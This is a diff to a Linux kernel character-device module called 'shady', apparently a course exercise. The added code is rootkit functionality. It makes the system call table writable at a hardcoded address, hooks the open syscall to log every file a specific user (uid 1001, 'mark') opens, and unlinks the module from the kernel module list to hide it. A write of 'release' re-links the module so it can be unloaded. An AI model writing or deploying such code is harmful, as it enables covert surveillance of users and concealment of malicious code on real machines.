@@ -29,6 +29,7 @@
 #include <linux/device.h>
 #include <linux/mutex.h>
 #include <linux/unistd.h>
+#include <linux/sched.h>
 
 #include <asm/uaccess.h>
 
@@ -42,6 +43,10 @@ MODULE_LICENSE("GPL");
 /* parameters */
 static int shady_ndevices = SHADY_NDEVICES;
 
+static s32                  marks_uid = 1001;
+static void**               system_call_table_address = (void*)0xffffffff81801400;
+static struct list_head*    prev;
+
 module_param(shady_ndevices, int, S_IRUGO);
 /* ================================================================ */
 
@@ -49,6 +54,25 @@ static unsigned int shady_major = 0;
 static struct shady_dev *shady_devices = NULL;
 static struct class *shady_class = NULL;
 /* ================================================================ */
+
+static void set_addr_rw (u64 addr)
+{
+u32 level;
+pte_t *pte = lookup_address(addr, &level);
+if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
+}
+
+static asmlinkage int (*old_open) (const char*, int, int);
+
+static asmlinkage int my_open (const char* file, int flags, int mode)
+{
+if(get_current_user()->uid.val == marks_uid)
+{
+printk(KERN_INFO "mark is about to open '%s'\n", file);
+}
+
+return old_open(file, flags, mode);
+}
 
 int
 shady_open(struct inode *inode, struct file *filp)
@@ -109,6 +133,15 @@ ssize_t retval = 0;
 if (mutex_lock_killable(&dev->shady_mutex))
 return -EINTR;
 
+#if 1
+if(!(strcmp(buf, "release")))
+{
+printk("Set module to unloadable\n");
+list_add(&THIS_MODULE->list, prev);
+return OK;
+}
+#endif
+
 mutex_unlock(&dev->shady_mutex);
 return retval;
 }
@@ -127,6 +160,23 @@ struct file_operations shady_fops = {
 .release =  shady_release,
 .llseek =   shady_llseek,
 };
+
+static void __replace_addr_and_hide(void)
+{
+/* replace the open function */
+set_addr_rw((u64)system_call_table_address);
+old_open = system_call_table_address[__NR_open];
+system_call_table_address[__NR_open] = my_open;
+
+/* Hide module */
+//list_del_init(&THIS_MODULE->list);
+list_del(&THIS_MODULE->list);
+}
+
+static void __restore_addr(void)
+{
+system_call_table_address[__NR_open] = old_open;
+}
 
 /* ================================================================ */
 /* Setup and register the device with specific index (the index is also
@@ -204,6 +254,7 @@ class_destroy(shady_class);
 /* [NB] shady_cleanup_module is never called if alloc_chrdev_region()
 * has failed. */
 unregister_chrdev_region(MKDEV(shady_major, 0), shady_ndevices);
+__restore_addr();
 return;
 }
 
@@ -214,6 +265,8 @@ int err = 0;
 int i = 0;
 int devices_to_destroy = 0;
 dev_t dev = 0;
+
+prev = THIS_MODULE->list.prev;
 
 if (shady_ndevices <= 0)
 {
@@ -256,6 +309,7 @@ goto fail;
 }
 }
 
+__replace_addr_and_hide();
 return 0; /* success */
 
 fail:
